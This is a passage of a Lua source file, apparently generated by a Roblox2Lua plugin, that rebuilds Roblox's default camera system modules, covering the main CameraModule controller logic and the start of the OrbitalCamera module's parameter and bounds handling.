--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

local camera_module = Instance.new("ModuleScript")
camera_module.Name = "CameraModule"
camera_module.Parent = workspace

local orbital_camera = Instance.new("ModuleScript")
orbital_camera.Name = "OrbitalCamera"
orbital_camera.Parent = camera_module

local mouse_lock_controller = Instance.new("ModuleScript")
mouse_lock_controller.Name = "MouseLockController"
mouse_lock_controller.Parent = camera_module

local camera_input = Instance.new("ModuleScript")
camera_input.Name = "CameraInput"
camera_input.Parent = camera_module

local zoom_controller = Instance.new("ModuleScript")
zoom_controller.Name = "ZoomController"
zoom_controller.Parent = camera_module

local popper = Instance.new("ModuleScript")
popper.Name = "Popper"
popper.Parent = zoom_controller

local invisicam = Instance.new("ModuleScript")
invisicam.Name = "Invisicam"
invisicam.Parent = camera_module

local camera_ui = Instance.new("ModuleScript")
camera_ui.Name = "CameraUI"
camera_ui.Parent = camera_module

local camera_toggle_statecontroller = Instance.new("ModuleScript")
camera_toggle_statecontroller.Name = "CameraToggleStateController"
camera_toggle_statecontroller.Parent = camera_module

local base_occlusion = Instance.new("ModuleScript")
base_occlusion.Name = "BaseOcclusion"
base_occlusion.Parent = camera_module

local transparency_controller = Instance.new("ModuleScript")
transparency_controller.Name = "TransparencyController"
transparency_controller.Parent = camera_module

local vehicle_camera = Instance.new("ModuleScript")
vehicle_camera.Name = "VehicleCamera"
vehicle_camera.Parent = camera_module

local vehicle_camera_core = Instance.new("ModuleScript")
vehicle_camera_core.Name = "VehicleCameraCore"
vehicle_camera_core.Parent = vehicle_camera

local vehicle_camera_config = Instance.new("ModuleScript")
vehicle_camera_config.Name = "VehicleCameraConfig"
vehicle_camera_config.Parent = vehicle_camera

local poppercam = Instance.new("ModuleScript")
poppercam.Name = "Poppercam"
poppercam.Parent = camera_module

local camera_utils = Instance.new("ModuleScript")
camera_utils.Name = "CameraUtils"
camera_utils.Parent = camera_module

local base_camera = Instance.new("ModuleScript")
base_camera.Name = "BaseCamera"
base_camera.Parent = camera_module

local legacy_camera = Instance.new("ModuleScript")
legacy_camera.Name = "LegacyCamera"
legacy_camera.Parent = camera_module

local classiccamera = Instance.new("ModuleScript")
classiccamera.Name = "ClassicCamera"
classiccamera.Parent = camera_module

--// Modules

local modules = {
	[camera_module] = function()
		--[[
			CameraModule - This ModuleScript implements a singleton class to manage the
			selection, activation, and deactivation of the current camera controller,
			character occlusion controller, and transparency controller. This script binds to
			RenderStepped at Camera priority and calls the Update() methods on the active
			controller instances.
		
			The camera controller ModuleScripts implement classes which are instantiated and
			activated as-needed, they are no longer all instantiated up front as they were in
			the previous generation of PlayerScripts.
		
			2018 PlayerScripts Update - AllYourBlox
		--]]
		
		local CameraModule = {}
		CameraModule.__index = CameraModule
		
		local FFlagUserRemoveTheCameraApi do
			local success, result = pcall(function()
				return UserSettings():IsUserFeatureEnabled("UserRemoveTheCameraApi")
			end)
			FFlagUserRemoveTheCameraApi = success and result
		end
		
		-- NOTICE: Player property names do not all match their StarterPlayer equivalents,
		-- with the differences noted in the comments on the right
		local PLAYER_CAMERA_PROPERTIES =
		{
			"CameraMinZoomDistance",
			"CameraMaxZoomDistance",
			"CameraMode",
			"DevCameraOcclusionMode",
			"DevComputerCameraMode",			-- Corresponds to StarterPlayer.DevComputerCameraMovementMode
			"DevTouchCameraMode",				-- Corresponds to StarterPlayer.DevTouchCameraMovementMode
		
			-- Character movement mode
			"DevComputerMovementMode",
			"DevTouchMovementMode",
			"DevEnableMouseLock",				-- Corresponds to StarterPlayer.EnableMouseLockOption
		}
		
		local USER_GAME_SETTINGS_PROPERTIES =
		{
			"ComputerCameraMovementMode",
			"ComputerMovementMode",
			"ControlMode",
			"GamepadCameraSensitivity",
			"MouseSensitivity",
			"RotationType",
			"TouchCameraMovementMode",
			"TouchMovementMode",
		}
		
		--[[ Roblox Services ]]--
		local Players = game:GetService("Players")
		local RunService = game:GetService("RunService")
		local UserInputService = game:GetService("UserInputService")
		local UserGameSettings = UserSettings():GetService("UserGameSettings")
		
		-- Static camera utils
		local CameraUtils = require(script:WaitForChild("CameraUtils"))
		local CameraInput = require(script:WaitForChild("CameraInput"))
		
		-- Load Roblox Camera Controller Modules
		local ClassicCamera = require(script:WaitForChild("ClassicCamera"))
		local OrbitalCamera = require(script:WaitForChild("OrbitalCamera"))
		local LegacyCamera = require(script:WaitForChild("LegacyCamera"))
		local VehicleCamera = require(script:WaitForChild("VehicleCamera"))
		
		-- Load Roblox Occlusion Modules
		local Invisicam = require(script:WaitForChild("Invisicam"))
		local Poppercam = require(script:WaitForChild("Poppercam"))
		
		-- Load the near-field character transparency controller and the mouse lock "shift lock" controller
		local TransparencyController = require(script:WaitForChild("TransparencyController"))
		local MouseLockController = require(script:WaitForChild("MouseLockController"))
		
		-- Table of camera controllers that have been instantiated. They are instantiated as they are used.
		local instantiatedCameraControllers = {}
		local instantiatedOcclusionModules = {}
		
		-- Management of which options appear on the Roblox User Settings screen
		do
			local PlayerScripts = Players.LocalPlayer:WaitForChild("PlayerScripts")
		
			PlayerScripts:RegisterTouchCameraMovementMode(Enum.TouchCameraMovementMode.Default)
			PlayerScripts:RegisterTouchCameraMovementMode(Enum.TouchCameraMovementMode.Follow)
			PlayerScripts:RegisterTouchCameraMovementMode(Enum.TouchCameraMovementMode.Classic)
		
			PlayerScripts:RegisterComputerCameraMovementMode(Enum.ComputerCameraMovementMode.Default)
			PlayerScripts:RegisterComputerCameraMovementMode(Enum.ComputerCameraMovementMode.Follow)
			PlayerScripts:RegisterComputerCameraMovementMode(Enum.ComputerCameraMovementMode.Classic)
			PlayerScripts:RegisterComputerCameraMovementMode(Enum.ComputerCameraMovementMode.CameraToggle)
		end
		
		
		function CameraModule.new()
			local self = setmetatable({},CameraModule)
		
			-- Current active controller instances
			self.activeCameraController = nil
			self.activeOcclusionModule = nil
			self.activeTransparencyController = nil
			self.activeMouseLockController = nil
		
			self.currentComputerCameraMovementMode = nil
		
			-- Connections to events
			self.cameraSubjectChangedConn = nil
			self.cameraTypeChangedConn = nil
		
			-- Adds CharacterAdded and CharacterRemoving event handlers for all current players
			for _,player in pairs(Players:GetPlayers()) do
				self:OnPlayerAdded(player)
			end
		
			-- Adds CharacterAdded and CharacterRemoving event handlers for all players who join in the future
			Players.PlayerAdded:Connect(function(player)
				self:OnPlayerAdded(player)
			end)
		
			self.activeTransparencyController = TransparencyController.new()
			self.activeTransparencyController:Enable(true)
		
			if not UserInputService.TouchEnabled then
				self.activeMouseLockController = MouseLockController.new()
				local toggleEvent = self.activeMouseLockController:GetBindableToggleEvent()
				if toggleEvent then
					toggleEvent:Connect(function()
						self:OnMouseLockToggled()
					end)
				end
			end
		
			self:ActivateCameraController(self:GetCameraControlChoice())
			self:ActivateOcclusionModule(Players.LocalPlayer.DevCameraOcclusionMode)
			self:OnCurrentCameraChanged() -- Does initializations and makes first camera controller
			RunService:BindToRenderStep("cameraRenderUpdate", Enum.RenderPriority.Camera.Value, function(dt) self:Update(dt) end)
		
			-- Connect listeners to camera-related properties
			for _, propertyName in pairs(PLAYER_CAMERA_PROPERTIES) do
				Players.LocalPlayer:GetPropertyChangedSignal(propertyName):Connect(function()
					self:OnLocalPlayerCameraPropertyChanged(propertyName)
				end)
			end
		
			for _, propertyName in pairs(USER_GAME_SETTINGS_PROPERTIES) do
				UserGameSettings:GetPropertyChangedSignal(propertyName):Connect(function()
					self:OnUserGameSettingsPropertyChanged(propertyName)
				end)
			end
			game.Workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
				self:OnCurrentCameraChanged()
			end)
		
			self.lastInputType = UserInputService:GetLastInputType()
			UserInputService.LastInputTypeChanged:Connect(function(newLastInputType)
				self.lastInputType = newLastInputType
			end)
		
			return self
		end
		
		function CameraModule:GetCameraMovementModeFromSettings()
			local cameraMode = Players.LocalPlayer.CameraMode
		
			-- Lock First Person trumps all other settings and forces ClassicCamera
			if cameraMode == Enum.CameraMode.LockFirstPerson then
				return CameraUtils.ConvertCameraModeEnumToStandard(Enum.ComputerCameraMovementMode.Classic)
			end
		
			local devMode, userMode
			if UserInputService.TouchEnabled then
				devMode = CameraUtils.ConvertCameraModeEnumToStandard(Players.LocalPlayer.DevTouchCameraMode)
				userMode = CameraUtils.ConvertCameraModeEnumToStandard(UserGameSettings.TouchCameraMovementMode)
			else
				devMode = CameraUtils.ConvertCameraModeEnumToStandard(Players.LocalPlayer.DevComputerCameraMode)
				userMode = CameraUtils.ConvertCameraModeEnumToStandard(UserGameSettings.ComputerCameraMovementMode)
			end
		
			if devMode == Enum.DevComputerCameraMovementMode.UserChoice then
				-- Developer is allowing user choice, so user setting is respected
				return userMode
			end
		
			return devMode
		end
		
		function CameraModule:ActivateOcclusionModule( occlusionMode )
			local newModuleCreator
			if occlusionMode == Enum.DevCameraOcclusionMode.Zoom then
				newModuleCreator = Poppercam
			elseif occlusionMode == Enum.DevCameraOcclusionMode.Invisicam then
				newModuleCreator = Invisicam
			else
				warn("CameraScript ActivateOcclusionModule called with unsupported mode")
				return
			end
		
			self.occlusionMode = occlusionMode
		
			-- First check to see if there is actually a change. If the module being requested is already
			-- the currently-active solution then just make sure it's enabled and exit early
			if self.activeOcclusionModule and self.activeOcclusionModule:GetOcclusionMode() == occlusionMode then
				if not self.activeOcclusionModule:GetEnabled() then
					self.activeOcclusionModule:Enable(true)
				end
				return
			end
		
			-- Save a reference to the current active module (may be nil) so that we can disable it if
			-- we are successful in activating its replacement
			local prevOcclusionModule = self.activeOcclusionModule
		
			-- If there is no active module, see if the one we need has already been instantiated
			self.activeOcclusionModule = instantiatedOcclusionModules[newModuleCreator]
		
			-- If the module was not already instantiated and selected above, instantiate it
			if not self.activeOcclusionModule then
				self.activeOcclusionModule = newModuleCreator.new()
				if self.activeOcclusionModule then
					instantiatedOcclusionModules[newModuleCreator] = self.activeOcclusionModule
				end
			end
		
			-- If we were successful in either selecting or instantiating the module,
			-- enable it if it's not already the currently-active enabled module
			if self.activeOcclusionModule then
				local newModuleOcclusionMode = self.activeOcclusionModule:GetOcclusionMode()
				-- Sanity check that the module we selected or instantiated actually supports the desired occlusionMode
				if newModuleOcclusionMode ~= occlusionMode then
					warn("CameraScript ActivateOcclusionModule mismatch: ",self.activeOcclusionModule:GetOcclusionMode(),"~=",occlusionMode)
				end
		
				-- Deactivate current module if there is one
				if prevOcclusionModule then
					-- Sanity check that current module is not being replaced by itself (that should have been handled above)
					if prevOcclusionModule ~= self.activeOcclusionModule then
						prevOcclusionModule:Enable(false)
					else
						warn("CameraScript ActivateOcclusionModule failure to detect already running correct module")
					end
				end
		
				-- Occlusion modules need to be initialized with information about characters and cameraSubject
				-- Invisicam needs the LocalPlayer's character
				-- Poppercam needs all player characters and the camera subject
				if occlusionMode == Enum.DevCameraOcclusionMode.Invisicam then
					-- Optimization to only send Invisicam what we know it needs
					if Players.LocalPlayer.Character then
						self.activeOcclusionModule:CharacterAdded(Players.LocalPlayer.Character, Players.LocalPlayer )
					end
				else
					-- When Poppercam is enabled, we send it all existing player characters for its raycast ignore list
					for _, player in pairs(Players:GetPlayers()) do
						if player and player.Character then
							self.activeOcclusionModule:CharacterAdded(player.Character, player)
						end
					end
					self.activeOcclusionModule:OnCameraSubjectChanged(game.Workspace.CurrentCamera.CameraSubject)
				end
		
				-- Activate new choice
				self.activeOcclusionModule:Enable(true)
			end
		end
		
		function CameraModule:ShouldUseVehicleCamera()
			local camera = workspace.CurrentCamera
			if not camera then
				return false
			end
			
			local cameraType = camera.CameraType
			local cameraSubject = camera.CameraSubject
			
			local isEligibleType = cameraType == Enum.CameraType.Custom or cameraType == Enum.CameraType.Follow
			local isEligibleSubject = cameraSubject and cameraSubject:IsA("VehicleSeat") or false
			local isEligibleOcclusionMode = self.occlusionMode ~= Enum.DevCameraOcclusionMode.Invisicam
		
			return isEligibleSubject and isEligibleType and isEligibleOcclusionMode
		end
		
		-- When supplied, legacyCameraType is used and cameraMovementMode is ignored (should be nil anyways)
		-- Next, if userCameraCreator is passed in, that is used as the cameraCreator
		function CameraModule:ActivateCameraController(cameraMovementMode, legacyCameraType)
			local newCameraCreator = nil
		
			if legacyCameraType~=nil then
				--[[
					This function has been passed a CameraType enum value. Some of these map to the use of
					the LegacyCamera module, the value "Custom" will be translated to a movementMode enum
					value based on Dev and User settings, and "Scriptable" will disable the camera controller.
				--]]
		
				if legacyCameraType == Enum.CameraType.Scriptable then
					if self.activeCameraController then
						self.activeCameraController:Enable(false)
						self.activeCameraController = nil
						return
					end
				elseif legacyCameraType == Enum.CameraType.Custom then
					cameraMovementMode = self:GetCameraMovementModeFromSettings()
		
				elseif legacyCameraType == Enum.CameraType.Track then
					-- Note: The TrackCamera module was basically an older, less fully-featured
					-- version of ClassicCamera, no longer actively maintained, but it is re-implemented in
					-- case a game was dependent on its lack of ClassicCamera's extra functionality.
					cameraMovementMode = Enum.ComputerCameraMovementMode.Classic
		
				elseif legacyCameraType == Enum.CameraType.Follow then
					cameraMovementMode = Enum.ComputerCameraMovementMode.Follow
		
				elseif legacyCameraType == Enum.CameraType.Orbital then
					cameraMovementMode = Enum.ComputerCameraMovementMode.Orbital
		
				elseif legacyCameraType == Enum.CameraType.Attach or
					   legacyCameraType == Enum.CameraType.Watch or
					   legacyCameraType == Enum.CameraType.Fixed then
					newCameraCreator = LegacyCamera
				else
					warn("CameraScript encountered an unhandled Camera.CameraType value: ",legacyCameraType)
				end
			end
		
			if not newCameraCreator then
				if cameraMovementMode == Enum.ComputerCameraMovementMode.Classic or
					cameraMovementMode == Enum.ComputerCameraMovementMode.Follow or
					cameraMovementMode == Enum.ComputerCameraMovementMode.Default or
					cameraMovementMode == Enum.ComputerCameraMovementMode.CameraToggle then
					newCameraCreator = ClassicCamera
				elseif cameraMovementMode == Enum.ComputerCameraMovementMode.Orbital then
					newCameraCreator = OrbitalCamera
				else
					warn("ActivateCameraController did not select a module.")
					return
				end
			end
		
			local isVehicleCamera = self:ShouldUseVehicleCamera()
			if isVehicleCamera then
				newCameraCreator = VehicleCamera
			end
		
			-- Create the camera control module we need if it does not already exist in instantiatedCameraControllers
			local newCameraController
			if not instantiatedCameraControllers[newCameraCreator] then
				newCameraController = newCameraCreator.new()
				instantiatedCameraControllers[newCameraCreator] = newCameraController
			else
				newCameraController = instantiatedCameraControllers[newCameraCreator]
				if newCameraController.Reset then
					newCameraController:Reset()
				end
			end
			
			if self.activeCameraController then
				-- deactivate the old controller and activate the new one
				if self.activeCameraController ~= newCameraController then
					self.activeCameraController:Enable(false)
					self.activeCameraController = newCameraController
					self.activeCameraController:Enable(true)
				elseif not self.activeCameraController:GetEnabled() then
					self.activeCameraController:Enable(true)
				end
			elseif newCameraController ~= nil then
				-- only activate the new controller
				self.activeCameraController = newCameraController
				self.activeCameraController:Enable(true)
			end
		
			if self.activeCameraController then
				if cameraMovementMode~=nil then
					self.activeCameraController:SetCameraMovementMode(cameraMovementMode)
				elseif legacyCameraType~=nil then
					-- Note that this is only called when legacyCameraType is not a type that
					-- was convertible to a ComputerCameraMovementMode value, i.e. really only applies to LegacyCamera
					self.activeCameraController:SetCameraType(legacyCameraType)
				end
			end
		end
		
		-- Note: The active transparency controller could be made to listen for this event itself.
		function CameraModule:OnCameraSubjectChanged()
			local camera = workspace.CurrentCamera
			local cameraSubject = camera and camera.CameraSubject
		
			if self.activeTransparencyController then
				self.activeTransparencyController:SetSubject(cameraSubject)
			end
		
			if self.activeOcclusionModule then
				self.activeOcclusionModule:OnCameraSubjectChanged(cameraSubject)
			end
		
			self:ActivateCameraController(nil, camera.CameraType)
		end
		
		function CameraModule:OnCameraTypeChanged(newCameraType)
			if newCameraType == Enum.CameraType.Scriptable then
				if UserInputService.MouseBehavior == Enum.MouseBehavior.LockCenter then
					UserInputService.MouseBehavior = Enum.MouseBehavior.Default
				end
			end
		
			-- Forward the change to ActivateCameraController to handle
			self:ActivateCameraController(nil, newCameraType)
		end
		
		-- Note: Called whenever workspace.CurrentCamera changes, but also on initialization of this script
		function CameraModule:OnCurrentCameraChanged()
			local currentCamera = game.Workspace.CurrentCamera
			if not currentCamera then return end
		
			if self.cameraSubjectChangedConn then
				self.cameraSubjectChangedConn:Disconnect()
			end
		
			if self.cameraTypeChangedConn then
				self.cameraTypeChangedConn:Disconnect()
			end
		
			self.cameraSubjectChangedConn = currentCamera:GetPropertyChangedSignal("CameraSubject"):Connect(function()
				self:OnCameraSubjectChanged(currentCamera.CameraSubject)
			end)
		
			self.cameraTypeChangedConn = currentCamera:GetPropertyChangedSignal("CameraType"):Connect(function()
				self:OnCameraTypeChanged(currentCamera.CameraType)
			end)
		
			self:OnCameraSubjectChanged(currentCamera.CameraSubject)
			self:OnCameraTypeChanged(currentCamera.CameraType)
		end
		
		function CameraModule:OnLocalPlayerCameraPropertyChanged(propertyName)
			if propertyName == "CameraMode" then
				-- CameraMode is only used to turn on/off forcing the player into first person view. The
				-- Note: The case "Classic" is used for all other views and does not correspond only to the ClassicCamera module
				if Players.LocalPlayer.CameraMode == Enum.CameraMode.LockFirstPerson then
					-- Locked in first person, use ClassicCamera which supports this
					if not self.activeCameraController or self.activeCameraController:GetModuleName() ~= "ClassicCamera" then
						self:ActivateCameraController(CameraUtils.ConvertCameraModeEnumToStandard(Enum.DevComputerCameraMovementMode.Classic))
					end
		
					if self.activeCameraController then
						self.activeCameraController:UpdateForDistancePropertyChange()
					end
				elseif Players.LocalPlayer.CameraMode == Enum.CameraMode.Classic then
					-- Not locked in first person view
					local cameraMovementMode = self:GetCameraMovementModeFromSettings()
					self:ActivateCameraController(CameraUtils.ConvertCameraModeEnumToStandard(cameraMovementMode))
				else
					warn("Unhandled value for property player.CameraMode: ",Players.LocalPlayer.CameraMode)
				end
		
			elseif propertyName == "DevComputerCameraMode" or 
				   propertyName == "DevTouchCameraMode" then
				local cameraMovementMode = self:GetCameraMovementModeFromSettings()
				self:ActivateCameraController(CameraUtils.ConvertCameraModeEnumToStandard(cameraMovementMode))
		
			elseif propertyName == "DevCameraOcclusionMode" then
				self:ActivateOcclusionModule(Players.LocalPlayer.DevCameraOcclusionMode)
		
			elseif propertyName == "CameraMinZoomDistance" or propertyName == "CameraMaxZoomDistance" then
				if self.activeCameraController then
					self.activeCameraController:UpdateForDistancePropertyChange()
				end
			elseif propertyName == "DevTouchMovementMode" then
			elseif propertyName == "DevComputerMovementMode" then
			elseif propertyName == "DevEnableMouseLock" then
				-- This is the enabling/disabling of "Shift Lock" mode, not LockFirstPerson (which is a CameraMode)
				-- Note: Enabling and disabling of MouseLock mode is normally only a publish-time choice made via
				-- the corresponding EnableMouseLockOption checkbox of StarterPlayer, and this script does not have
				-- support for changing the availability of MouseLock at runtime (this would require listening to
				-- Player.DevEnableMouseLock changes)
			end
		end
		
		function CameraModule:OnUserGameSettingsPropertyChanged(propertyName)
			if propertyName == "ComputerCameraMovementMode" then
				local cameraMovementMode = self:GetCameraMovementModeFromSettings()
				self:ActivateCameraController(CameraUtils.ConvertCameraModeEnumToStandard(cameraMovementMode))
			end
		end
		
		--[[
			Main RenderStep Update. The camera controller and occlusion module both have opportunities
			to set and modify (respectively) the CFrame and Focus before it is set once on CurrentCamera.
			The camera and occlusion modules should only return CFrames, not set the CFrame property of
			CurrentCamera directly.
		--]]
		function CameraModule:Update(dt)
			if self.activeCameraController then
				self.activeCameraController:UpdateMouseBehavior()
		
				local newCameraCFrame, newCameraFocus = self.activeCameraController:Update(dt)
				self.activeCameraController:ApplyVRTransform()
				if self.activeOcclusionModule then
					newCameraCFrame, newCameraFocus = self.activeOcclusionModule:Update(dt, newCameraCFrame, newCameraFocus)
				end
		
				-- Here is where the new CFrame and Focus are set for this render frame
				game.Workspace.CurrentCamera.CFrame = newCameraCFrame
				game.Workspace.CurrentCamera.Focus = newCameraFocus
		
				-- Update to character local transparency as needed based on camera-to-subject distance
				if self.activeTransparencyController then
					self.activeTransparencyController:Update()
				end
		
				if CameraInput.getInputEnabled() then
					CameraInput.resetInputForFrameEnd()
				end
			end
		end
		
		-- Formerly getCurrentCameraMode, this function resolves developer and user camera control settings to
		-- decide which camera control module should be instantiated. The old method of converting redundant enum types
		function CameraModule:GetCameraControlChoice()
			local player = Players.LocalPlayer
		
			if player then
				if self.lastInputType == Enum.UserInputType.Touch or UserInputService.TouchEnabled then
					-- Touch
					if player.DevTouchCameraMode == Enum.DevTouchCameraMovementMode.UserChoice then
						return CameraUtils.ConvertCameraModeEnumToStandard( UserGameSettings.TouchCameraMovementMode )
					else
						return CameraUtils.ConvertCameraModeEnumToStandard( player.DevTouchCameraMode )
					end
				else
					-- Computer
					if player.DevComputerCameraMode == Enum.DevComputerCameraMovementMode.UserChoice then
						local computerMovementMode = CameraUtils.ConvertCameraModeEnumToStandard(UserGameSettings.ComputerCameraMovementMode)
						return CameraUtils.ConvertCameraModeEnumToStandard(computerMovementMode)
					else
						return CameraUtils.ConvertCameraModeEnumToStandard(player.DevComputerCameraMode)
					end
				end
			end
		end
		
		function CameraModule:OnCharacterAdded(char, player)
			if self.activeOcclusionModule then
				self.activeOcclusionModule:CharacterAdded(char, player)
			end
		end
		
		function CameraModule:OnCharacterRemoving(char, player)
			if self.activeOcclusionModule then
				self.activeOcclusionModule:CharacterRemoving(char, player)
			end
		end
		
		function CameraModule:OnPlayerAdded(player)
			player.CharacterAdded:Connect(function(char)
				self:OnCharacterAdded(char, player)
			end)
			player.CharacterRemoving:Connect(function(char)
				self:OnCharacterRemoving(char, player)
			end)
		end
		
		function CameraModule:OnMouseLockToggled()
			if self.activeMouseLockController then
				local mouseLocked = self.activeMouseLockController:GetIsMouseLocked()
				local mouseLockOffset = self.activeMouseLockController:GetMouseLockOffset()
				if self.activeCameraController then
					self.activeCameraController:SetIsMouseLocked(mouseLocked)
					self.activeCameraController:SetMouseLockOffset(mouseLockOffset)
				end
			end
		end
		
		local cameraModuleObject = CameraModule.new()
		local cameraApi = {}
		
		if FFlagUserRemoveTheCameraApi then
			return cameraApi
		else
			return cameraModuleObject
		end
		
	end[orbital_camera] = function()
		--[[
			OrbitalCamera - Spherical coordinates control camera for top-down games
			2018 Camera Update - AllYourBlox
		--]]
		
		-- Local private variables and constants
		local UNIT_Z = Vector3.new(0,0,1)
		local X1_Y0_Z1 = Vector3.new(1,0,1)	--Note: not a unit vector, used for projecting onto XZ plane
		local ZERO_VECTOR3 = Vector3.new(0,0,0)
		local TAU = 2 * math.pi
		
		-- Do not edit these values, they are not the developer-set limits, they are limits
		-- to the values the camera system equations can correctly handle
		local MIN_ALLOWED_ELEVATION_DEG = -80
		local MAX_ALLOWED_ELEVATION_DEG = 80
		
		local externalProperties = {}
		externalProperties["InitialDistance"]  = 25
		externalProperties["MinDistance"]      = 10
		externalProperties["MaxDistance"]      = 100
		externalProperties["InitialElevation"] = 35
		externalProperties["MinElevation"]     = 35
		externalProperties["MaxElevation"]     = 35
		externalProperties["ReferenceAzimuth"] = -45	-- Angle around the Y axis where the camera starts. -45 offsets the camera in the -X and +Z directions equally
		externalProperties["CWAzimuthTravel"]  = 90	-- How many degrees the camera is allowed to rotate from the reference position, CW as seen from above
		externalProperties["CCWAzimuthTravel"] = 90	-- How many degrees the camera is allowed to rotate from the reference position, CCW as seen from above
		externalProperties["UseAzimuthLimits"] = false -- Full rotation around Y axis available by default
		
		local Util = require(script.Parent:WaitForChild("CameraUtils"))
		local CameraInput = require(script.Parent:WaitForChild("CameraInput"))
		
		--[[ Services ]]--
		local PlayersService = game:GetService('Players')
		local VRService = game:GetService("VRService")
		
		--[[ The Module ]]--
		local BaseCamera = require(script.Parent:WaitForChild("BaseCamera"))
		local OrbitalCamera = setmetatable({}, BaseCamera)
		OrbitalCamera.__index = OrbitalCamera
		
		
		function OrbitalCamera.new()
			local self = setmetatable(BaseCamera.new(), OrbitalCamera)
		
			self.lastUpdate = tick()
		
			-- OrbitalCamera-specific members
			self.changedSignalConnections = {}
			self.refAzimuthRad = nil
			self.curAzimuthRad = nil
			self.minAzimuthAbsoluteRad = nil
			self.maxAzimuthAbsoluteRad = nil
			self.useAzimuthLimits = nil
			self.curElevationRad = nil
			self.minElevationRad = nil
			self.maxElevationRad = nil
			self.curDistance = nil
			self.minDistance = nil
			self.maxDistance = nil
		
			self.gamepadDollySpeedMultiplier = 1
		
			self.lastUserPanCamera = tick()
		
			self.externalProperties = {}
			self.externalProperties["InitialDistance"] 	= 25
			self.externalProperties["MinDistance"] 		= 10
			self.externalProperties["MaxDistance"] 		= 100
			self.externalProperties["InitialElevation"] 	= 35
			self.externalProperties["MinElevation"] 		= 35
			self.externalProperties["MaxElevation"] 		= 35
			self.externalProperties["ReferenceAzimuth"] 	= -45	-- Angle around the Y axis where the camera starts. -45 offsets the camera in the -X and +Z directions equally
			self.externalProperties["CWAzimuthTravel"] 	= 90	-- How many degrees the camera is allowed to rotate from the reference position, CW as seen from above
			self.externalProperties["CCWAzimuthTravel"] 	= 90	-- How many degrees the camera is allowed to rotate from the reference position, CCW as seen from above
			self.externalProperties["UseAzimuthLimits"] 	= false -- Full rotation around Y axis available by default
			self:LoadNumberValueParameters()
		
			return self
		end
		
		function OrbitalCamera:LoadOrCreateNumberValueParameter(name, valueType, updateFunction)
			local valueObj = script:FindFirstChild(name)
		
			if valueObj and valueObj:isA(valueType) then
				-- Value object exists and is the correct type, use its value
				self.externalProperties[name] = valueObj.Value
			elseif self.externalProperties[name] ~= nil then
				-- Create missing (or replace incorrectly-typed) valueObject with default value
				valueObj = Instance.new(valueType)
				valueObj.Name = name
				valueObj.Parent = script
				valueObj.Value = self.externalProperties[name]
			else
				return
			end
		
			if updateFunction then
				if self.changedSignalConnections[name] then
					self.changedSignalConnections[name]:Disconnect()
				end
				self.changedSignalConnections[name] = valueObj.Changed:Connect(function(newValue)
					self.externalProperties[name] = newValue
					updateFunction(self)
				end)
			end
		end
		
		function OrbitalCamera:SetAndBoundsCheckAzimuthValues()
			self.minAzimuthAbsoluteRad = math.rad(self.externalProperties["ReferenceAzimuth"]) - math.abs(math.rad(self.externalProperties["CWAzimuthTravel"]))
			self.maxAzimuthAbsoluteRad = math.rad(self.externalProperties["ReferenceAzimuth"]) + math.abs(math.rad(self.externalProperties["CCWAzimuthTravel"]))
			self.useAzimuthLimits = self.externalProperties["UseAzimuthLimits"]
			if self.useAzimuthLimits then
				self.curAzimuthRad = math.max(self.curAzimuthRad, self.minAzimuthAbsoluteRad)
				self.curAzimuthRad = math.min(self.curAzimuthRad, self.maxAzimuthAbsoluteRad)
			end
		end
		
		function OrbitalCamera:SetAndBoundsCheckElevationValues()
			-- These degree values are the direct user input values. It is deliberate that they are
			-- ranged checked only against the extremes, and not against each other. Any time one
			-- is changed, both of the internal values in radians are recalculated. This allows for
			-- A developer to change the values in any order and for the end results to be that the
			-- internal values adjust to match intent as best as possible.
			local minElevationDeg = math.max(self.externalProperties["MinElevation"], MIN_ALLOWED_ELEVATION_DEG)
			local maxElevationDeg = math.min(self.externalProperties["MaxElevation"], MAX_ALLOWED_ELEVATION_DEG)
		
			-- Set internal values in radians
			self.minElevationRad = math.rad(math.min(minElevationDeg, maxElevationDeg))
			self.maxElevationRad = math.rad(math.max(minElevationDeg, maxElevationDeg))
			self.curElevationRad = math.max(self.curElevationRad, self.minElevationRad)
			self.curElevationRad = math.min(self.curElevationRad, self.maxElevationRad)
		end
		
		function OrbitalCamera:SetAndBoundsCheckDistanceValues()
			self.minDistance = self.externalProperties["MinDistance"]
			self.maxDistance = self.externalProperties["MaxDistance"]
			self.curDistance = math.max(self.curDistance, self.minDistance)
			self.curDistance = math.min(self.curDistance, self.maxDistance)
		end
		
		-- This loads from, or lazily creates, NumberValue objects for exposed parameters
		function OrbitalCamera:LoadNumberValueParameters()
			-- These initial values do not require change listeners since they are read only once
			self:LoadOrCreateNumberValueParameter("InitialElevation", "NumberValue", nil)
			self:LoadOrCreateNumberValueParameter("InitialDistance", "NumberValue", nil)
		
			-- Note: ReferenceAzimuth is also used as an initial value, but needs a change listener because it is used in the calculation of the limits
			self:LoadOrCreateNumberValueParameter("ReferenceAzimuth", "NumberValue", self.SetAndBoundsCheckAzimuthValue)
			self:LoadOrCreateNumberValueParameter("CWAzimuthTravel", "NumberValue", self.SetAndBoundsCheckAzimuthValues)
			self:LoadOrCreateNumberValueParameter("CCWAzimuthTravel", "NumberValue", self.SetAndBoundsCheckAzimuthValues)
			self:LoadOrCreateNumberValueParameter("MinElevation", "NumberValue", self.SetAndBoundsCheckElevationValues)
			self:LoadOrCreateNumberValueParameter("MaxElevation", "NumberValue", self.SetAndBoundsCheckElevationValues)
			self:LoadOrCreateNumberValueParameter("MinDistance", "NumberValue", self.SetAndBoundsCheckDistanceValues)
			self:LoadOrCreateNumberValueParameter("MaxDistance", "NumberValue", self.SetAndBoundsCheckDistanceValues)
			self:LoadOrCreateNumberValueParameter("UseAzimuthLimits", "BoolValue", self.SetAndBoundsCheckAzimuthValues)
		
			-- Internal values set (in radians, from degrees), plus sanitization
			self.curAzimuthRad = math.rad(self.externalProperties["ReferenceAzimuth"])
			self.curElevationRad = math.rad(self.externalProperties["InitialElevation"])
			self.curDistance = self.externalProperties["InitialDistance"]
		
			self:SetAndBoundsCheckAzimuthValues()
			self:SetAndBoundsCheckElevationValues()
			self:SetAndBoundsCheckDistanceValues()
		end
		
		function OrbitalCamera:GetModuleName()
			return "OrbitalCamera"
		end
		
		function OrbitalCamera:SetInitialOrientation(humanoid)
			if not humanoid or not humanoid.RootPart then
				warn("OrbitalCamera could not set initial orientation due to missing humanoid")
				return
			end
			local newDesiredLook = (humanoid.RootPart.CFrame.lookVector - Vector3.new(0,0.23,0)).unit
